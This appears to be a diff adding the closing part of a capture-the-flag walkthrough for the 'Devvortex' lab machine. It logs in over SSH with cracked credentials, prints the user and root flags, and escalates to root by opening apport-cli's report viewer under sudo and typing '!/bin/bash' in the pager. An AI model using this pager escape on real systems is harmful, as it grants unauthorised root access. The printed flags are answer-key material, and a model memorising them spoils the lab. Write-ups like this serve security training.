@@ -213,4 +213,127 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
+That's means the `logan`'s credentials are
+```
+user: logan
+pass: tequieromucho
+```
 
+Let's try connect with `ssh`  !
+```
+ssh logan@devvortex.htb
+```
+> Enter *tequieromucho* as password
+
+Done ! So let's check for the ```user.txt``` flag
+```
+75601b525474a3c1f239dd5507e8b1da
+```
+
+Let's start the privilege scalation ! Let's check our privileges
+```
+sudo -l
+```
+
+We have this : `apport`!
+```
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+```
+
+Let's get the version of this tool
+```
+logan@devvortex:~$ sudo /usr/bin/apport-cli -v
+2.20.11
+```
+
+Looking on internet for a exploit, there's a [exploit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) ! let's exploit this !
+```
+sudo /usr/bin/apport-cli /var/crash/_usr_bin_sleep.1000.crash
+```
+
+We are supposed to have this output
+```
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (29.9 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I:  Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C):
+```
+> Following the exploit, let's enter the letter `V` !
+
+
+The output will only show something like that
+```
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+```
+
+When the script is running, the two points will appear. 
+```
+== CasperMD5CheckResult =================================
+skip
+
+== CoreDump =================================
+(binary data)
+
+== Date =================================
+Mon Dec  4 15:42:02 2023
+
+== Dependencies =================================
+gcc-10-base 10.5.0-1ubuntu1~20.04
+libacl1 2.2.53-6
+libattr1 1:2.4.48-5
+libc6 2.31-0ubuntu9.12
+libcrypt1 1:4.4.10-10ubuntu4
+libgcc-s1 10.5.0-1ubuntu1~20.04
+:
+```
+
+Instead of tapping on `q` (for quiting), tap `!/bin/bash` and then tap `enter`
+```
+...
+Mon Dec  4 15:42:02 2023
+
+== Dependencies =================================
+gcc-10-base 10.5.0-1ubuntu1~20.04
+libacl1 2.2.53-6
+libattr1 1:2.4.48-5
+libc6 2.31-0ubuntu9.12
+libcrypt1 1:4.4.10-10ubuntu4
+libgcc-s1 10.5.0-1ubuntu1~20.04
+!/bin/bash
+```
+
+This will provide us the root acces ! this is will be the output
+```
+......................................................................................................................................................................................................................................................................................................ERROR: Cannot update tmp.crash: [Errno 13] Permission denied: 'tmp.crash'
+...............
+root@devvortex:#
+```
+
+Finally, we can juste see the flag !
+```
+cat /root/root.txt
+```
+
+We have the flag !
+```
+19d0b523f3e20fe52d70a836284ee15e
+```
+
+The machine is now pwned !
